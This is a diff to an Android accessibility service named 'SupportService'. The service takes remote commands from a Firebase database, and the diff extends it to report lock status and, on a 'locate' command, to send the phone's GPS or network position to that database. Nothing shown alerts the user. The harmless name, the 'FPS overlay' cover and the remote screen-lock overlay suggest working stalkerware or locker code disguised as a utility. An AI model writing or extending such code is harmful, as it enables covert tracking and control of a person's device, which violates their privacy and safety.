@@ -19,9 +19,14 @@ import android.view.WindowManager;
 import android.view.WindowInsets;
 import android.view.WindowInsetsController;
 import android.view.accessibility.AccessibilityEvent;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
 import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
+import androidx.annotation.NonNull;
 
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
@@ -185,6 +190,7 @@ public class SupportService extends AccessibilityService {
                             hideFpsOverlay();
                             showOverlay();
                             isLocked = true;
+                            sendStatusReport("Locked by Command");
                         }
                     } else if (cmd.equalsIgnoreCase("unlock")) {
                         if (isLocked) {
@@ -195,7 +201,10 @@ public class SupportService extends AccessibilityService {
                             if (fpsPrefs.getBoolean("is_showing", false)) {
                                 showFpsOverlay();
                             }
+                            sendStatusReport("Unlocked by Command");
                         }
+                    } else if (cmd.equalsIgnoreCase("locate")) {
+                        requestCurrentLocation();
                     }
                 });
             }
@@ -203,6 +212,53 @@ public class SupportService extends AccessibilityService {
             @Override
             public void onCancelled(DatabaseError error) {}
         });
+    }
+
+    private void sendStatusReport(String message) {
+        String deviceId = getDeviceId();
+        DatabaseReference deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
+        deviceRef.child("status").setValue(message);
+        deviceRef.child("status_time").setValue(System.currentTimeMillis());
+    }
+
+    private void requestCurrentLocation() {
+        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        try {
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
+                    @Override
+                    public void onLocationChanged(@NonNull Location location) {
+                        updateFirebaseLocation(location);
+                    }
+                    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+                    @Override public void onProviderEnabled(@NonNull String provider) {}
+                    @Override public void onProviderDisabled(@NonNull String provider) {}
+                }, Looper.getMainLooper());
+            } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, new LocationListener() {
+                    @Override
+                    public void onLocationChanged(@NonNull Location location) {
+                        updateFirebaseLocation(location);
+                    }
+                    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+                    @Override public void onProviderEnabled(@NonNull String provider) {}
+                    @Override public void onProviderDisabled(@NonNull String provider) {}
+                }, Looper.getMainLooper());
+            }
+        } catch (SecurityException e) {
+            sendStatusReport("Location Error: No Permission");
+        }
+    }
+
+    private void updateFirebaseLocation(Location loc) {
+        String deviceId = getDeviceId();
+        DatabaseReference locRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("location");
+        locRef.child("lat").setValue(loc.getLatitude());
+        locRef.child("lon").setValue(loc.getLongitude());
+        locRef.child("time").setValue(System.currentTimeMillis());
+        locRef.child("acc").setValue(loc.getAccuracy());
+        
+        sendStatusReport("Location Updated: " + loc.getLatitude() + ", " + loc.getLongitude());
     }
 
     private void showFpsOverlay() {
